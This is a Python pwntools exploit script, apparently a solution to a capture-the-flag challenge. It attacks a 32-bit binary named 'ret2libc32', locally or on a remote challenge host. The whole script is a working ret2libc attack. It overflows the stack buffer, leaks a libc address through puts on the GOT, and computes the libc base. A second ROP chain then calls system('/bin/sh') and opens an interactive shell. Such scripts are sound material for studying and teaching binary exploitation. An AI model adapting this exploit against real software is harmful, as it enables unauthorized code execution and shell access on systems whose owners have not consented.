#!/usr/bin/env python3

from os.path import dirname
from pwn import *

elf = context.binary = ELF(f"{dirname(__file__)}/../generate/ret2libc32")


def start():
    global libc
    if args.REMOTE:
        libc = ELF(f"{dirname(__file__)}/libc6-i386_2.35-0ubuntu3_amd64.so")
        return remote("pwn.platypew.social", 30006)

    libc = elf.libc

    if args.GDB:
        return gdb.debug(elf.path, gdbscript='continue')

    return process(elf.path)

p = start()

rop = ROP(elf)
rop.raw(b"A" * cyclic_find(0x61616174))
rop.call('puts', [elf.got['gets']])
rop.call('vuln')

p.sendline(rop.chain())
p.recvuntil(b"Guess my name\n")

gets = p.recvuntil(b"\n").strip()[:4]
GETS_LIBC = u32(gets)

log.info(f"GETS@LIBC: {hex(GETS_LIBC)}")

libc.address = GETS_LIBC - libc.sym["gets"]
log.info(f"LIBC BASE: {hex(libc.address)}")

rop = ROP([elf, libc])
rop.raw(b"A" * cyclic_find(0x61616174))
rop.call('system', [next(libc.search(b"/bin/sh\x00"))])
rop.call('exit', [0])

p.sendline(rop.chain())
p.clean()
p.interactive()
